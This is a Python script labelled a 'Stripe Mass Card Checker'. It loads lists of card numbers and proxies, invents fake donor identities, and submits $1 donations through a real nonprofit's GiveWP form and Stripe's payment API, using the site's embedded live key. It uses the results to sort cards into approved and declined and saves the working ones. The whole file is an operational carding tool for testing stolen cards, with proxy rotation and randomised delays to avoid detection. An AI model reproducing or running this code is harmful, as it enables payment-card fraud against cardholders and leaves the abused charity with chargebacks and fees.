import requests
import re
import html
import json
from urllib.parse import urlparse, parse_qs
import random
import time
import os
from faker import Faker
from colorama import Fore, Style, init
import uuid

init(autoreset=True)
fake = Faker("en_US")

def load_proxies(proxy_file="proxies.txt"):
    """Load proxies from file in ip:port:user:pass format"""
    proxies = []
    if os.path.exists(proxy_file):
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    parts = line.split(':')
                    if len(parts) >= 2:
                        ip = parts[0]
                        port = parts[1]
                        if len(parts) >= 4:
                            user = parts[2]
                            password = parts[3]
                            proxy = f"http://{user}:{password}@{ip}:{port}"
                        else:
                            proxy = f"http://{ip}:{port}"
                        proxies.append(proxy)
    return proxies

def load_cards(card_file="cc.txt"):
    """Load cards from file and normalize format"""
    cards = []
    if not os.path.exists(card_file):
        print(f"{Fore.RED}Error: {card_file} not found!")
        return cards
    
    with open(card_file, 'r') as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith('#'):
                parts = line.split('|')
                if len(parts) >= 4:
                    cc = parts[0].strip()
                    mm = parts[1].strip()
                    yy = parts[2].strip()
                    cvv = parts[3].strip()
                    
                    if len(yy) == 2:
                        yy = "20" + yy
                    
                    if len(mm) == 1:
                        mm = "0" + mm
                    
                    cards.append((cc, mm, yy, cvv))
    
    return cards

def generate_random_info():
    """Generate random personal information"""
    full_name = fake.name()
    first_name, last_name = full_name.split(' ', 1) if ' ' in full_name else (full_name, '')
    username = "".join(full_name.split()).lower()
    random_digits = str(random.randint(1000, 9999))
    email = f"{username}{random_digits}@gmail.com"
    
    street = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zip_code = fake.zipcode()
    
    return first_name, last_name, email, street, city, state, zip_code

def check_card(card_details, use_proxy=False, proxy=None):
    start_time = time.time()
    cc, mm, yy, cvv = card_details
    
    session = requests.Session()
    if use_proxy and proxy:
        session.proxies = {'http': proxy, 'https': proxy}
    
    try:
        first_name, last_name, email, street, city, state, zip_code = generate_random_info()
        time_on_page = str(random.randint(100000, 150000))
        
        # Step 1: Get initial page
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        response = session.get('https://livingroomconversations.org/donate/', headers=headers)

        # Step 2: Get donation form
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'referer': 'https://livingroomconversations.org/donate/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donation-form-view',
            'form-id': '1272',
            'locale': 'en_US',
        }

        response = session.get('https://livingroomconversations.org/', params=params, headers=headers)
        html_text = response.text

        m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
        if not m:
            elapsed = time.time() - start_time
            return 'Error', 'donateUrl not found', '', elapsed, 'Live ✅' if not use_proxy else 'Dead ❌'
        
        donate_url = html.unescape(m.group(1))
        q = parse_qs(urlparse(donate_url).query)

        sig = q.get("givewp-route-signature", [""])[0]
        exp = q.get("givewp-route-signature-expiration", [""])[0]

        # Step 3: Submit donation form
        headers = {
            'authority': 'livingroomconversations.org',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': "application/x-www-form-urlencoded; charset=UTF-8",
            'origin': 'https://livingroomconversations.org',
            'referer': 'https://livingroomconversations.org/?givewp-route=donation-form-view&form-id=1272&locale=en_US',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        params = {
            'givewp-route': 'donate',
            'givewp-route-signature': sig,
            'givewp-route-signature-id': 'givewp-donate',
            'givewp-route-signature-expiration': exp,
        }

        data = {
            'amount': '1',
            'currency': 'USD',
            'donationType': 'single',
            'subscriptionPeriod': 'one-time',
            'subscriptionFrequency': '1',
            'subscriptionInstallments': '0',
            'formId': '1272',
            'gatewayId': 'stripe_payment_element',
            'feeRecovery': '0',
            'fundId': '1',
            'firstName': first_name,
            'lastName': last_name,
            'anonymous': 'false',
            'email': email,
            'country': 'US',
            'address1': street,
            'address2': '',
            'city': city,
            'state': state,
            'zip': zip_code,
            'mailchimp': 'true',
            'donationBirthday': '',
            'originUrl': 'https://livingroomconversations.org/donate/',
            'isEmbed': 'true',
            'embedId': 'give-form-shortcode-1',
            'locale': 'en_US',
            'gatewayData[stripePaymentMethod]': 'card',
            'gatewayData[stripePaymentMethodIsCreditCard]': 'true',
            'gatewayData[formId]': '1272',
            'gatewayData[stripeKey]': 'pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY',
            'gatewayData[stripeConnectedAccountId]': 'acct_1BI2rXLb2HpJQ5gR',
        }

        response = session.post('https://livingroomconversations.org/', params=params, headers=headers, data=data)
        
        try:
            resp = json.loads(response.text)
        except:
            elapsed = time.time() - start_time
            return 'Error', 'Invalid JSON response', '', elapsed, 'Live ✅' if not use_proxy else 'Dead ❌'

        client_secret = resp["data"]["clientSecret"]
        payment_intent = client_secret.split("_secret")[0]
        return_url = resp["data"]["returnUrl"]

        qs = parse_qs(urlparse(return_url).query)
        receipt_id = qs.get("givewp-receipt-id", [""])[0] or qs.get("receipt-id", [""])[0]

        if receipt_id:
            final_return_url = (
                "https://livingroomconversations.org/donate/"
                "?givewp-event=donation-completed"
                "&givewp-listener=show-donation-confirmation-receipt"
                f"&givewp-receipt-id={receipt_id}"
                "&givewp-embed-id=give-form-shortcode-1"
            )
        else:
            final_return_url = return_url

        # Step 4: Confirm payment with Stripe
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36',
        }

        data = {
            "return_url": final_return_url,
            "payment_method_data[billing_details][name]": f"{first_name} {last_name}",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[billing_details][address][city]": city,
            "payment_method_data[billing_details][address][country]": "US",
            "payment_method_data[billing_details][address][line1]": street,
            "payment_method_data[billing_details][address][line2]": "",
            "payment_method_data[billing_details][address][postal_code]": zip_code,
            "payment_method_data[billing_details][address][state]": state,
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": yy[-2:],
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[payment_user_agent]": "stripe.js/6675c28e57; stripe-js-v3/6675c28e57; payment-element; deferred-intent; autopm",
            "payment_method_data[referrer]": "https://livingroomconversations.org",
            "payment_method_data[time_on_page]": time_on_page,
            "payment_method_data[client_attribution_metadata][client_session_id]": str(uuid.uuid4()),
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "deferred",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "automatic",
            "payment_method_data[client_attribution_metadata][elements_session_config_id]": str(uuid.uuid4()),
            "payment_method_data[guid]": str(uuid.uuid4()),
            "payment_method_data[muid]": str(uuid.uuid4()),
            "payment_method_data[sid]": str(uuid.uuid4()),
            "expected_payment_method_type": "card",
            "client_context[currency]": "usd",
            "client_context[mode]": "payment",
            "use_stripe_sdk": "true",
            "key": "pk_live_51BI2rXLb2HpJQ5gR82FXaLJG4yQHBmh64hBr5goTxJfUHMkjHTNgdW4CqGqlIHjFDwislSaKW8vnoD5mcpsuqfoY00YhfyMyMY",
            "_stripe_account": "acct_1BI2rXLb2HpJQ5gR",
            "client_secret": client_secret
        }

        response = session.post(
            f'https://api.stripe.com/v1/payment_intents/{payment_intent}/confirm',
            headers=headers,
            data=data,
        )
        
        try:
            resp_json = response.json()
        except:
            resp_json = {}
        
        elapsed = time.time() - start_time

        if 'error' in resp_json:
            error = resp_json['error']
            status = 'Declined'
            message = error.get('message', 'Declined')
            code = error.get('decline_code', error.get('code', ''))
            proxy_status = 'Live ✅' if not use_proxy else ('Live ✅' if response.status_code < 500 else 'Dead ❌')
            return status, message, code, elapsed, proxy_status

        status_val = resp_json.get('status', '')
        if status_val == 'succeeded':
            status = 'Approved'
            message = 'CHARGED 1$🔥'
            code = ''
        elif status_val == 'requires_action':
            status = '3D Secure'
            message = 'APPROVED_3D✅️'
            code = ''
        else:
            status = 'Unknown'
            message = 'Unknown response'
            code = ''

        proxy_status = 'Live ✅' if not use_proxy else ('Live ✅' if response.status_code < 500 else 'Dead ❌')
        return status, message, code, elapsed, proxy_status

    except requests.exceptions.RequestException as e:
        elapsed = time.time() - start_time
        return 'Error', str(e), '', elapsed, 'Dead ❌'
    except Exception as e:
        elapsed = time.time() - start_time
        return 'Error', str(e), '', elapsed, 'Live ✅'

def main():
    print(f"{Fore.CYAN}Stripe Mass Card Checker")
    print(f"{Fore.CYAN}========================")
    
    use_proxy = input("Do you want to continue with proxies (y/n): ").lower() == 'y'
    
    proxies = []
    if use_proxy:
        proxies = load_proxies()
        if not proxies:
            print(f"{Fore.RED}No proxies found in proxies.txt. Continuing without proxies.")
            use_proxy = False
        else:
            print(f"{Fore.GREEN}Loaded {len(proxies)} proxies.")
    
    cards = load_cards()
    if not cards:
        return
    
    print(f"{Fore.GREEN}Loaded {len(cards)} cards.")
    print("Please wait, Checking your cards.....")
    print()
    
    valid_cards = []
    
    for i, card in enumerate(cards, 1):
        cc, mm, yy, cvv = card
        card_str = f"{cc}|{mm}|{yy}|{cvv}"
        
        proxy = random.choice(proxies) if use_proxy and proxies else None
        
        status, message, code, elapsed, proxy_status = check_card(card, use_proxy, proxy)
        
        if status == 'Approved':
            color = Fore.GREEN
            valid_cards.append(card_str)
        elif status == '3D Secure':
            color = Fore.YELLOW
            valid_cards.append(card_str)
        elif status == 'Declined':
            color = Fore.RED
        else:
            color = Fore.WHITE
        
        result = f"{card_str} => {color}{status}   [{message}]"
        if code:
            result += f" ({code})"
        result += f"    Time: {elapsed:.2f}s    Proxy: {proxy_status}"
        
        print(result)
        
        if i < len(cards):
            time.sleep(random.uniform(1, 3))
    
    if valid_cards:
        with open('valid.txt', 'w') as f:
            for card in valid_cards:
                f.write(f"{card}\n")
        print(f"\n{Fore.GREEN}Saved {len(valid_cards)} valid cards to valid.txt")

if __name__ == "__main__":
    main()
